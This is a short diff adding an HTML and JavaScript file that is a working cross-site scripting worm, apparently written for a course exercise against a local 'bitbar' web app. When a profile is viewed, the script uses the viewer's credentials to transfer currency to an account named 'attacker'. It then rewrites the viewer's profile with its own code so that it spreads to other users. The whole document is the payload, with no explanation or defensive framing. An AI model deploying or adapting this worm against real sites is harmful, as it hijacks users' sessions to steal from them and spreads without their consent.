@@ -1,0 +1,19 @@
+<p id="profile_worm_txt">You are attacked by the profile worm!!!</p>
+<span id='bitbar_count' class='10'></span>
+<script type="text/javascript">
+let transfer_form_data = 'destination_username=attacker&quantity=1';
+let transfer_request = new XMLHttpRequest();
+transfer_request.withCredentials=true;
+transfer_request.open('POST', 'http://localhost:3000/post_transfer');
+transfer_request.onload = function() {
+    let profile_txt = document.getElementById('profile');
+    let new_profile_txt = 'new_profile='.concat(escape(profile_txt.innerHTML));
+    const profile_req = new XMLHttpRequest();
+    profile_req.withCredentials=true;
+    profile_req.open('POST', 'http://localhost:3000/set_profile');
+    profile_req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    profile_req.send(new_profile_txt);
+}
+transfer_request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+transfer_request.send(transfer_form_data);
+</script>
